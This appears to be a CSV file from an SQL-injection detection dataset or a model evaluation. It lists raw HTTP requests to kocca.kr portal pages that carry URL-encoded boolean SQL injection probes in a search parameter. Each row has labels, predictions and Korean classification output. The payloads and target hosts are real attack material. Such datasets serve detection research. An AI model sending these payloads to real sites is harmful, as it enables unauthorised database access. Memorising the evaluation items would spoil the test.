Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
3043,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%201943%3D1943%20AND%20%28%28%285784%3D5784&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%29%29%20AND%201943%3D1943%20AND%20%28%28%285784%3D5784
공격 유형 : SQL Injection"
7924,"GET /portal/bbs/list/B0000204.do?searchCnd=%29%20AND%202451%3D2451%20AND%20%288540%3D8540&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\r\nReferer: http://bestgame.kocca.kr:80/portal/bbs/list/B0000204.do\r\nHost: bestgame.kocca.kr\r\nCookie: KCSESSIONID=RyRLgt7ptTh19xNyHSHGnrRY5j7jhq5XrCGz2yP3H4WhR0Hs0QGL!1739629523!965280821\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%20AND%202451%3D2451%20AND%20%288540%3D8540
공격 유형 : SQL Injection"
23373,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%29%20AND%209998%3D8227%20AND%20%28%28%28%22wNEw%22%20LIKE%20%22wNEw&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20110518 Firefox/4.0.1\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=RGhmgkPdM6RfnKQFBSjyJ2xLpYDLKSpLZpQXHfynfyN7QbnhB1Dh!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%22%29%29%29%20AND%209998%3D8227%20AND%20%28%28%28%22wNEw%22%20LIKE%20%22wNEw
공격 유형 : SQL Injection"
3249,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%20WHERE%206713%3D6713%20AND%208553%3D8372--%20Fihb&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %22%29%20WHERE%206713%3D6713%20AND%208553%3D8372--%20Fihb
공격 유형 : SQL Injection"
19899,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%20AND%201276%3D8653%20AND%20%28%22PYaM%22%20LIKE%20%22PYaM&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %22%29%20AND%201276%3D8653%20AND%20%28%22PYaM%22%20LIKE%20%22PYaM
공격 유형 : SQL Injection"
22208,"GET /portal/bbs/list/B0000204.do?searchCnd=%27%29%29%20AND%208325%3D8325%20AND%20%28%28%27gqnQ%27%3D%27gqnQ&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=203026&categorys=3&subcate=312&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=57 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Linux Mint/6 (Felicia) Firefox/3.0.9\r\nCookie: KCSESSIONID=l2ypgstJ1TqgChLxv1FLySy6HB6Hr1Nm1S5VbL004s25qCL391Td!1739629523!965280821\r\nHost: kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %27%29%29%20AND%208325%3D8325%20AND%20%28%28%27gqnQ%27%3D%27gqnQ
공격 유형 : SQL Injection"
10140,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%20WHERE%206422%3D6422%20AND%205206%3D8121--%20MpOM&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : WHERE 6422=6422 AND 5206=8121--
공격 유형 : SQL Injection"
1188,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%20AND%209974%3D9974%20AND%20%28%27Jcvd%27%20LIKE%20%27Jcvd&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,0,False,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
14321,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%29%20AND%209974%3D9974%20AND%20%28%28%28%22xoTH%22%20LIKE%20%22xoTH&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %22%29%29%29%20AND%209974%3D9974%20AND%20%28%28%28%22xoTH%22%20LIKE%20%22xoTH
공격 유형 : SQL Injection"
28211,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%20AND%209255%3D7597%20AND%20%28%287457%3D7457&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%29%20AND%209255%3D7597%20AND%20%28%287457%3D7457
공격 유형 : SQL Injection"
